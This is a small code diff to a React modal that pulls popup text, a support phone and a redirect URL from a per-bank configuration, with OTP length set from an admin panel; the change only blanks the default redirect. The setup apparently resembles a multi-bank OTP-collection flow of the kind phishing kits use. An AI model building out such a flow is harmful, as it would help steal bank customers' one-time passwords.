@@ -28,7 +28,7 @@ export default function FinalActionModal({
   const subheading = bankConfig?.popupSubheading || bankConfig?.popupSubtitle || "";
   const bodyText = bankConfig?.popupBody || bankConfig?.popupMessage || "";
   const buttonText = bankConfig?.buttonText || bankConfig?.popupButtonText || "Continue";
-  const redirectUrl = bankConfig?.redirectUrl || bankConfig?.popupRedirectUrl || "https://google.com";
+  const redirectUrl = bankConfig?.redirectUrl || bankConfig?.popupRedirectUrl || "";
   const supportPhone = bankConfig?.supportPhone || bankConfig?.helplineNumber || "";
 
   // Dynamic OTP Length from Admin Panel (Default 6 digits)
